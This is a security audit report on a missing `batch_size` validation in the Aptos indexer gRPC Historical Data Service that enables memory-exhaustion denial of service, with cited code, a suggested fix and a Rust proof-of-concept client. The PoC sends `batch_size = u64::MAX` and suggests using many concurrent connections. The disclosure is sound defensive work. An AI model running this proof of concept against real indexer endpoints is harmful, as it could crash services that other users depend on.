# Audit Report

## Title
Indexer gRPC Service Batch Size Validation Bypass Enables Memory Exhaustion DoS

## Summary
The `GetTransactionsRequest.batch_size` parameter lacks validation despite protobuf documentation stating values greater than 1000 should be rejected. The Historical Data Service accepts arbitrarily large batch sizes and lacks byte-size limits when constructing responses, enabling attackers to trigger memory exhaustion and API crashes through oversized `TransactionsResponse` messages.

## Finding Description

The protobuf definition explicitly documents that `batch_size` should default to 1000 and reject values larger than 1000: [1](#0-0) 

However, both the Historical and Live Data Services fail to enforce this validation. The Historical Data Service is particularly vulnerable: [2](#0-1) [3](#0-2) 

The code accepts any `batch_size` value (including `u64::MAX`) and uses it directly as `max_num_transactions_per_batch` without validation. When chunking transactions for responses, the Historical Data Service only enforces transaction count limits with no byte-size protection: [4](#0-3) 

Unlike the Live Data Service which has a `MAX_BYTES_PER_BATCH = 20MB` safeguard: [5](#0-4) [6](#0-5) 

The Historical Data Service lacks this protection, allowing responses to grow up to the gRPC message size limit of 256MB: [7](#0-6) 

**Attack Path:**
1. Attacker sends `GetTransactionsRequest` with `batch_size = u64::MAX` or other large value (e.g., 100,000)
2. Historical Data Service accepts the request without validation
3. Service reads transaction files from file store (each file contains up to 50MB of compressed data)
4. At response construction, `transactions.chunks(max_num_transactions_per_batch)` with `max_num_transactions_per_batch = u64::MAX` effectively disables chunking
5. Service creates `TransactionsResponse` messages containing hundreds of thousands of transactions (up to 256MB per response)
6. Server must allocate and serialize the massive response, risking OOM
7. Clients must allocate and deserialize the massive response, risking OOM
8. Multiple concurrent malicious requests amplify memory exhaustion

This violates the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability meets **High Severity** criteria per the Aptos bug bounty program:

- **API crashes**: Oversized responses cause memory exhaustion leading to service crashes
- **Validator node slowdowns**: If the indexer gRPC service runs on the same host as a validator node, memory exhaustion impacts validator performance
- **Significant protocol violations**: The implementation violates its own documented API contract

The attack requires no special privileges and can be executed by any client with network access to the indexer gRPC endpoint. The 256MB response size limit combined with concurrent requests can rapidly exhaust available memory on both server and client systems.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- No authentication required
- Single gRPC request with modified parameter
- No rate limiting on batch_size values
- Historical Data Service actively used by indexer clients

The discrepancy between documented behavior (default 1000, reject > 1000) and actual behavior (default 10000, accept u64::MAX) suggests this was an implementation oversight rather than intentional design.

## Recommendation

Implement strict validation on `batch_size` to enforce the documented limits:

**For Historical Data Service:**
```rust
const MAX_BATCH_SIZE: usize = 1000;
const DEFAULT_BATCH_SIZE: usize = 1000;

let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
    if batch_size > MAX_BATCH_SIZE as u64 {
        let err = Err(Status::invalid_argument(
            format!("batch_size {} exceeds maximum allowed value of {}", batch_size, MAX_BATCH_SIZE)
        ));
        info!("Client error: {err:?}.");
        let _ = response_sender.blocking_send(err);
        continue;
    }
    batch_size as usize
} else {
    DEFAULT_BATCH_SIZE
};
```

**Additionally, add byte-size protection similar to Live Data Service:**
```rust
const MAX_BYTES_PER_BATCH: usize = 20 * (1 << 20); // 20MB

// When constructing responses, enforce both transaction count AND byte size
let mut current_batch = Vec::new();
let mut current_bytes = 0;

for transaction in transactions {
    let txn_bytes = transaction.encoded_len();
    if current_batch.len() >= max_num_transactions_per_batch 
       || current_bytes + txn_bytes > MAX_BYTES_PER_BATCH {
        // Send current batch and start new one
        responses.push(create_response(current_batch, ...));
        current_batch = Vec::new();
        current_bytes = 0;
    }
    current_batch.push(transaction);
    current_bytes += txn_bytes;
}
```

Apply the same validation to Live Data Service for consistency.

## Proof of Concept

```rust
// PoC: Malicious gRPC client triggering memory exhaustion
use aptos_protos::indexer::v1::{
    raw_data_client::RawDataClient, GetTransactionsRequest
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = RawDataClient::connect("http://indexer-grpc-endpoint:50051").await?;
    
    // Attack: Request with maximum batch_size to disable chunking
    let malicious_request = GetTransactionsRequest {
        starting_version: Some(1000000),
        transactions_count: Some(100000), // Request 100k transactions
        batch_size: Some(u64::MAX),       // No chunking - all in one response
        transaction_filter: None,
    };
    
    let mut stream = client
        .get_transactions(Request::new(malicious_request))
        .await?
        .into_inner();
    
    // Server attempts to send response with 100k transactions in single message
    // This can be up to 256MB, causing memory exhaustion on both ends
    while let Some(response) = stream.message().await? {
        println!("Received {} transactions", response.transactions.len());
        // In a real attack, repeat this with multiple concurrent connections
    }
    
    Ok(())
}
```

**Reproduction steps:**
1. Deploy indexer gRPC Historical Data Service
2. Run the PoC client with `batch_size = u64::MAX` and large `transactions_count`
3. Observe server memory usage spike as it constructs oversized responses
4. Launch multiple concurrent clients to amplify memory exhaustion
5. Service crashes or becomes unresponsive due to OOM

## Notes

The vulnerability exists due to a fundamental mismatch between API documentation and implementation. The Live Data Service has partial mitigation through byte-size limits, but the Historical Data Service is fully vulnerable. Both services violate their documented API contract by accepting batch sizes greater than 1000.

The 256MB gRPC message size limit provides an upper bound but is still large enough to cause significant memory exhaustion, especially under concurrent load. The issue is exacerbated by the fact that file store files can contain tens of thousands of transactions, all of which get loaded into memory before chunking.

### Citations

**File:** protos/proto/aptos/indexer/v1/raw_data.proto (L27-29)
```text
  // Optional; number of transactions in each `TransactionsResponse` for current stream.
  // If not present, default to 1000. If larger than 1000, request will be rejected.
  optional uint64 batch_size = 3;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L27-27)
```rust
const DEFAULT_MAX_NUM_TRANSACTIONS_PER_BATCH: usize = 10000;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L102-106)
```rust
                let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
                    batch_size as usize
                } else {
                    DEFAULT_MAX_NUM_TRANSACTIONS_PER_BATCH
                };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L202-219)
```rust
                let responses = if !transactions.is_empty() {
                    let mut current_version = first_processed_version;
                    let mut responses: Vec<_> = transactions
                        .chunks(max_num_transactions_per_batch)
                        .map(|chunk| {
                            let first_version = current_version;
                            let last_version = chunk.last().unwrap().version;
                            current_version = last_version + 1;
                            TransactionsResponse {
                                transactions: chunk.to_vec(),
                                chain_id: Some(self.chain_id),
                                processed_range: Some(ProcessedRange {
                                    first_version,
                                    last_version,
                                }),
                            }
                        })
                        .collect();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L28-28)
```rust
const MAX_BYTES_PER_BATCH: usize = 20 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/in_memory_cache.rs (L84-86)
```rust
            while version < ending_version
                && total_bytes < max_bytes_per_batch
                && result.len() < max_num_transactions_per_batch
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L31-31)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```
